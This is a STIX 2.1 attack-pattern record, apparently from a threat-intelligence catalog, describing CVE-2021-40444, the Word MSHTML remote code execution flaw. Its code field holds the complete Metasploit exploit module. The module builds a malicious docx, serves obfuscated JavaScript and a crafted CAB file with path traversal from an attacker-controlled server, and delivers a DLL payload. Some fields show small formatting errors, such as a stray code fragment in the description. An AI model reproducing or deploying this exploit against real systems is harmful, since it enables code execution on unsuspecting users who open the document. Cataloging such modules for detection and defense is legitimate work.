{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7aafc81b-7515-4e15-b164-fd5965369585",
    "created": "2024-08-14T16:36:41.81715Z",
    "modified": "2024-08-14T16:36:41.817153Z",
    "name": "Microsoft Office Word Malicious MSHTML RCE",
    "description": " This module creates a malicious docx file that when opened in Word on a vulnerable Windows system will lead to code execution. This vulnerability exists because an attacker can craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/word_mshtml_rce.rb",
            "external_id": "word_mshtml_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444"
        },
        {
            "source_name": "reference",
            "url": "https://www.sentinelone.com/blog/peeking-into-cve-2021-40444-ms-office-zero-day-vulnerability-exploited-in-the-wild/"
        },
        {
            "source_name": "reference",
            "url": "http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/ms-cab.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/klezVirus/CVE-2021-40444"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Office Word Malicious MSHTML RCE',\n        'Description' => %q{\n          This module creates a malicious docx file that when opened in Word on a vulnerable Windows\n          system will lead to code execution. This vulnerability exists because an attacker can\n          craft a malicious ActiveX control to be used by a Microsoft Office document that hosts\n          the browser rendering engine.\n        },\n        'References' => [\n          ['CVE', '2021-40444'],\n          ['URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444'],\n          ['URL', 'https://www.sentinelone.com/blog/peeking-into-cve-2021-40444-ms-office-zero-day-vulnerability-exploited-in-the-wild/'],\n          ['URL', 'http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf'],\n          ['URL', 'https://github.com/lockedbyte/CVE-2021-40444/blob/master/REPRODUCE.md'],\n          ['URL', 'https://github.com/klezVirus/CVE-2021-40444']\n        ],\n        'Author' => [\n          'lockedbyte ', # Vulnerability discovery.\n          'klezVirus ', # References and PoC.\n          'thesunRider', # Official Metasploit module.\n          'mekhalleh (RAMELLA S\u00e9bastien)' # Zeop-CyberSecurity - code base contribution and refactoring.\n        ],\n        'DisclosureDate' => '2021-09-23',\n        'License' => MSF_LICENSE,\n        'Privileged' => false,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X64],\n        'Payload' => {\n          'DisableNops' => true\n        },\n        'DefaultOptions' => {\n          'FILENAME' => 'msf.docx'\n        },\n        'Targets' => [\n          [\n            'Hosted', {}\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [UNRELIABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('OBFUSCATE', [true, 'Obfuscate JavaScript content.', true])\n    ])\n    register_advanced_options([\n      OptPath.new('DocxTemplate', [ false, 'A DOCX file that will be used as a template to build the exploit.' ]),\n    ])\n  end\n\n  def bin_to_hex(bstr)\n    return(bstr.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join)\n  end\n\n  def cab_checksum(data, seed = \"\\x00\\x00\\x00\\x00\")\n    checksum = seed\n\n    bytes = ''\n    data.chars.each_slice(4).map(&:join).each do |dword|\n      if dword.length == 4\n        checksum = checksum.unpack('C*').zip(dword.unpack('C*')).map { |a, b| a ^ b }.pack('C*')\n      else\n        bytes = dword\n      end\n    end\n    checksum = checksum.reverse\n\n    case (data.length % 4)\n    when 3\n      dword = \"\\x00#{bytes}\"\n    when 2\n      dword = \"\\x00\\x00#{bytes}\"\n    when 1\n      dword = \"\\x00\\x00\\x00#{bytes}\"\n    else\n      dword = \"\\x00\\x00\\x00\\x00\"\n    end\n\n    checksum = checksum.unpack('C*').zip(dword.unpack('C*')).map { |a, b| a ^ b }.pack('C*').reverse\n  end\n\n  # http://download.microsoft.com/download/4/d/a/4da14f27-b4ef-4170-a6e6-5b1ef85b1baa/[ms-cab].pdf\n  def create_cab(data)\n    cab_cfdata = ''\n    filename = \"../#{File.basename(@my_resources.first)}.inf\"\n    block_size = 32768\n    struct_cffile = 0xd\n    struct_cfheader = 0x30\n\n    block_counter = 0\n    data.chars.each_slice(block_size).map(&:join).each do |block|\n      block_counter += 1\n\n      seed = \"#{[block.length].pack('S')}#{[block.length].pack('S')}\"\n      csum = cab_checksum(block, seed)\n\n      vprint_status(\"Data block added w/ checksum: #{bin_to_hex(csum)}\")\n      cab_cfdata << csum                     # uint32 {4} - Checksum\n      cab_cfdata << [block.length].pack('S') # uint16 {2} - Compressed Data Length\n      cab_cfdata << [block.length].pack('S') # uint16 {2} - Uncompressed Data Length\n      cab_cfdata << block\n    end\n\n    cab_size = [\n      struct_cfheader +\n        struct_cffile +\n        filename.length +\n        cab_cfdata.length\n    ].pack('L<')\n\n    # CFHEADER (http://wiki.xentax.com/index.php/Microsoft_Cabinet_CAB)\n    cab_header = \"\\x4D\\x53\\x43\\x46\" # uint32 {4} - Header (MSCF)\n    cab_header << \"\\x00\\x00\\x00\\x00\" # uint32 {4} - Reserved (null)\n    cab_header << cab_size # uint32 {4} - Archive Length\n    cab_header << \"\\x00\\x00\\x00\\x00\"         # uint32 {4} - Reserved (null)\n\n    cab_header << \"\\x2C\\x00\\x00\\x00\"         # uint32 {4} - Offset to the first CFFILE\n    cab_header << \"\\x00\\x00\\x00\\x00\"         # uint32 {4} - Reserved (null)\n    cab_header << \"\\x03\"                     # byte   {1} - Minor Version (3)\n    cab_header << \"\\x01\"                     # byte   {1} - Major Version (1)\n    cab_header << \"\\x01\\x00\"                 # uint16 {2} - Number of Folders\n    cab_header << \"\\x01\\x00\"                 # uint16 {2} - Number of Files\n    cab_header << \"\\x00\\x00\"                 # uint16 {2} - Flags\n\n    cab_header << \"\\xD2\\x04\"                 # uint16 {2} - Cabinet Set ID Number\n    cab_header << \"\\x00\\x00\"                 # uint16 {2} - Sequential Number of this Cabinet file in a Set\n\n    # CFFOLDER\n    cab_header << [                          # uint32 {4} - Offset to the first CFDATA in this Folder\n      struct_cfheader +\n      struct_cffile +\n      filename.length\n    ].pack('L<')\n    cab_header << [block_counter].pack('S<') # uint16 {2} - Number of CFDATA blocks in this Folder\n    cab_header << \"\\x00\\x00\"                 # uint16 {2} - Compression Format for each CFDATA in this Folder (1 = MSZIP)\n\n    # increase file size to trigger vulnerability\n    cab_header << [ # uint32 {4} - Uncompressed File Length (\"\\x02\\x00\\x5C\\x41\")\n      data.length + 1073741824\n    ].pack('L<')\n\n    # set current date and time in the format of cab file\n    date_time = Time.new\n    date = [((date_time.year - 1980) << 9) + (date_time.month << 5) + date_time.day].pack('S')\n    time = [(date_time.hour << 11) + (date_time.min << 5) + (date_time.sec / 2)].pack('S')\n\n    # CFFILE\n    cab_header << \"\\x00\\x00\\x00\\x00\"         # uint32 {4} - Offset in the Uncompressed CFDATA for the Folder this file belongs to (relative to the start of the Uncompressed CFDATA for this Folder)\n    cab_header << \"\\x00\\x00\"                 # uint16 {2} - Folder ID (starts at 0)\n    cab_header << date                       # uint16 {2} - File Date (\\x5A\\x53)\n    cab_header << time                       # uint16 {2} - File Time (\\xC3\\x5C)\n    cab_header << \"\\x20\\x00\"                 # uint16 {2} - File Attributes\n    cab_header << filename                   # byte   {X} - Filename (ASCII)\n    cab_header << \"\\x00\"                     # byte   {1} - null Filename Terminator\n\n    cab_stream = cab_header\n\n    # CFDATA\n    cab_stream << cab_cfdata\n  end\n\n  def generate_html\n    uri = \"#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri(@my_resources.first.to_s)}.cab\"\n    inf = \"#{File.basename(@my_resources.first)}.inf\"\n\n    file_path = ::File.join(::Msf::Config.data_directory, 'exploits', 'CVE-2021-40444', 'cve_2021_40444.js')\n    js_content = ::File.binread(file_path)\n\n    js_content.gsub!('REPLACE_INF', inf)\n    js_content.gsub!('REPLACE_URI', uri)\n    if datastore['OBFUSCATE']\n      print_status('Obfuscate JavaScript content')\n\n      js_content = Rex::Exploitation::JSObfu.new js_content\n      js_content = js_content.obfuscate(memory_sensitive: false)\n    end\n\n    html = '<!DOCTYPE html><html><head><meta http-equiv=\"Expires\" content=\"-1\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=11\"></head><body><script>'\n    html += js_content.to_s\n    html += '</script></body></html>'\n    html\n  end\n\n  def get_file_in_docx(fname)\n    i = @docx.find_index { |item| item[:fname] == fname }\n\n    unless i\n      fail_with(Failure::NotFound, \"This template cannot be used because it is missing: #{fname}\")\n    end\n\n    @docx.fetch(i)[:data]\n  end\n\n  def get_template_path\n    datastore['DocxTemplate'] || File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-40444', 'cve-2021-40444.docx')\n  end\n\n  def inject_docx\n    document_xml = get_file_in_docx('word/document.xml')\n    unless document_xml\n      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/document.xml')\n    end\n\n    document_xml_rels = get_file_in_docx('word/_rels/document.xml.rels')\n    unless document_xml_rels\n      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/_rels/document.xml.rels')\n    end\n\n    uri = \"#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri(@my_resources.first.to_s)}.html\"\n    @docx.each do |entry|\n      case entry[:fname]\n      when 'word/document.xml'\n        entry[:data] = document_xml.to_s.gsub!('TARGET_HERE', uri.to_s)\n      when 'word/_rels/document.xml.rels'\n        entry[:data] = document_xml_rels.to_s.gsub!('TARGET_HERE', \"mhtml:#{uri}!x-usc:#{uri}\")\n      end\n    end\n  end\n\n  def normalize_uri(*strs)\n    new_str = strs * '/'\n\n    new_str = new_str.gsub!('//', '/') while new_str.index('//')\n\n    # makes sure there's a starting slash\n    unless new_str[0, 1] == '/'\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def on_request_uri(cli, request)\n    header_cab = {\n      'Access-Control-Allow-Origin' => '*',\n      'Access-Control-Allow-Methods' => 'GET, POST, OPTIONS',\n      'Cache-Control' => 'no-store, no-cache, must-revalidate',\n      'Content-Type' => 'application/octet-stream',\n      'Content-Disposition' => \"attachment; filename=#{File.basename(@my_resources.first)}.cab\"\n    }\n\n    header_html = {\n      'Access-Control-Allow-Origin' => '*',\n      'Access-Control-Allow-Methods' => 'GET, POST',\n      'Cache-Control' => 'no-store, no-cache, must-revalidate',\n      'Content-Type' => 'text/html; charset=UTF-8'\n    }\n\n    if request.method.eql? 'HEAD'\n      if request.raw_uri.to_s.end_with? '.cab'\n        send_response(cli, '', header_cab)\n      else\n        send_response(cli, '', header_html)\n      end\n    elsif request.method.eql? 'OPTIONS'\n      response = create_response(501, 'Unsupported Method')\n      response['Content-Type'] = 'text/html'\n      response.body = ''\n\n      cli.send_response(response)\n    elsif request.raw_uri.to_s.end_with? '.html'\n      print_status('Sending HTML Payload')\n\n      send_response_html(cli, generate_html, header_html)\n    elsif request.raw_uri.to_s.end_with? '.cab'\n      print_status('Sending CAB Payload')\n\n      send_response(cli, create_cab(@dll_payload), header_cab)\n    end\n  end\n\n  def pack_docx\n    @docx.each do |entry|\n      if entry[:data].is_a?(Nokogiri::XML::Document)\n        entry[:data] = entry[:data].to_s\n      end\n    end\n\n    Msf::Util::EXE.to_zip(@docx)\n  end\n\n  def unpack_docx(template_path)\n    document = []\n\n    Zip::File.open(template_path) do |entries|\n      entries.each do |entry|\n        if entry.name.match(/\\.xml|\\.rels$/i)\n          content = Nokogiri::XML(entry.get_input_stream.read) if entry.file?\n        elsif entry.file?\n          content = entry.get_input_stream.read\n        end\n\n        vprint_status(\"Parsing item from template: #{entry.name}\")\n\n        document << { fname: entry.name, data: content }\n      end\n    end\n\n    document\n  end\n\n  def primer\n    print_status('CVE-2021-40444: Generate a malicious docx file')\n\n    @proto = (datastore['SSL'] ? 'https' : 'http')\n    if datastore['SRVHOST'] == '0.0.0.0'\n      datastore['SRVHOST'] = Rex::Socket.source_address\n    end\n\n    template_path = get_template_path\n    unless File.extname(template_path).match(/\\.docx$/i)\n      fail_with(Failure::BadConfig, 'Template is not a docx file!')\n    end\n\n    print_status(\"Using template '#{template_path}'\")\n    @docx = unpack_docx(template_path)\n\n    print_status('Injecting payload in docx document')\n    inject_docx\n\n    print_status(\"Finalizing docx '#{datastore['FILENAME']}'\")\n    file_create(pack_docx)\n\n    @dll_payload = Msf::Util::EXE.to_win64pe_dll(\n      framework,\n      payload.encoded,\n      {\n        arch: payload.arch.first,\n        mixed_mode: true,\n        platform: 'win'\n      }\n    )\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}